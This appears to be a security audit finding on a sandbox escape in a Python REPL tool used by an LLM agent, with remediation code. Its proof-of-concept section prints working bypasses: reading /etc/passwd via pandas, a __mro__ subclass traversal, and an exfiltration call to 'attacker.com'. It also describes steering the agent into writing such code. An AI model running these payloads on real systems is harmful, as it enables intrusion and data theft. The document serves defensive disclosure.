# SEC-002: Arbitrary Code Execution via Python REPL

## Severity: CRITICAL
## CVSS Score: 9.8
## CWE: CWE-94 (Improper Control of Generation of Code)

---

## Location

| File | Line | Function |
|------|------|----------|
| `backend/src/tools/analysis_tools.py` | 179-294 | `python_repl()` |
| `backend/src/tools/analysis_tools.py` | 243 | `exec(compiled, safe_globals, local_vars)` |

---

## Description

The `python_repl` tool executes arbitrary Python code provided by the LLM agent. While import restrictions are in place, the sandbox has multiple bypass vectors:

1. **Pre-imported modules expose dangerous functions**: `pandas`, `numpy` can access filesystem
2. **No file system isolation**: Code can read/write files accessible to the process
3. **No network isolation**: Allowed modules can make network requests
4. **getattr/setattr in builtins**: Can be used to access restricted attributes

---

## Vulnerable Code

```python
# Line 243: Direct exec() of user-influenced code
exec(compiled, safe_globals, local_vars)

# Allowed builtins include dangerous functions
SAFE_BUILTINS = {
    "getattr": getattr,  # Can access __class__.__mro__
    "setattr": setattr,  # Can modify objects
    "type": type,        # Can create new types
    ...
}

# Pre-imported pandas allows file access
safe_globals["pd"] = pd  # pd.read_csv('/etc/passwd')
```

---

## Proof of Concept

### Bypass 1: File System Access via Pandas

```python
# Attacker query: "Analyze sales data"
# LLM generates code that reads system files

code = """
import pandas as pd
# Read sensitive file
df = pd.read_csv('/etc/passwd', sep=':', header=None)
print(df.to_string())
"""
```

### Bypass 2: Object Attribute Traversal

```python
code = """
# Escape sandbox via getattr chain
obj = ().__class__.__mro__[1].__subclasses__()
for cls in obj:
    if 'warning' in str(cls).lower():
        print(cls.__init__.__globals__)
"""
```

### Bypass 3: Network Exfiltration via NumPy

```python
code = """
import numpy as np
# NumPy can load from URLs in some configurations
# Or use pandas.read_csv with URL
import pandas as pd
# Exfiltrate data
sensitive_data = "secret"
pd.read_csv(f'http://attacker.com/?data={sensitive_data}')
"""
```

---

## Impact

1. **Remote Code Execution**: Full server compromise if sandbox is bypassed
2. **Data Exfiltration**: Read any file accessible to the process
3. **Lateral Movement**: Access to GCP credentials, Tableau tokens
4. **Denial of Service**: Resource exhaustion, infinite loops

---

## Remediation

### Option 1: Docker-based Sandbox (Recommended)

```python
import docker

def python_repl_sandboxed(code: str, timeout: int = 30) -> dict:
    client = docker.from_env()

    container = client.containers.run(
        "python:3.11-slim",
        command=["python", "-c", code],
        detach=True,
        mem_limit="256m",
        cpu_period=100000,
        cpu_quota=50000,
        network_disabled=True,  # No network access
        read_only=True,         # Read-only filesystem
        security_opt=["no-new-privileges"],
        user="nobody",
    )

    try:
        result = container.wait(timeout=timeout)
        logs = container.logs()
        return {"success": result["StatusCode"] == 0, "output": logs}
    finally:
        container.remove(force=True)
```

### Option 2: RestrictedPython Library

```python
from RestrictedPython import compile_restricted, safe_builtins

def python_repl_restricted(code: str) -> dict:
    byte_code = compile_restricted(code, '<inline>', 'exec')

    restricted_globals = {
        '__builtins__': safe_builtins,
        '_print_': PrintCollector,
        '_getattr_': guarded_getattr,
    }

    exec(byte_code, restricted_globals)
```

### Option 3: Remove REPL Entirely

If analysis can be done with pre-defined functions, remove arbitrary code execution and use a DSL or pre-approved operations.

---

## Additional Hardening

1. Remove `getattr`, `setattr`, `type` from SAFE_BUILTINS
2. Disable network access for the process
3. Use seccomp filters to block dangerous syscalls
4. Run in a dedicated sandbox user with minimal permissions
5. Add audit logging for all code execution

---

## Effort: HIGH
## Priority: IMMEDIATE (24 hours)

---

## References

- https://cwe.mitre.org/data/definitions/94.html
- https://www.python.org/dev/peps/pep-0578/
- https://restrictedpython.readthedocs.io/
- https://gvisor.dev/docs/
